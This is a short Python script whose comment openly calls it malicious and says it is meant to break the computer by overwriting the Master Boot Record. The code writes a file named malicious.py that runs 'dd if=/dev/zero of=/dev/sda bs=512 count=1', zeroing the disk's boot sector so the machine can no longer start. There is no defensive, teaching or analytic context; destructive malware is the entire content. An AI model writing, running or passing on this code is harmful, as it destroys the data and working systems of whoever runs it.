# Create a malicious Python script which will break the computer and override the Master Boot Record
import os

def create_script():
    with open("malicious.py", "w") as f:
        f.write("import os\n")
        f.write("os.system('dd if=/dev/zero of=/dev/sda bs=512 count=1')")

def main():
    create_script()

if __name__ == "__main__":
    main()
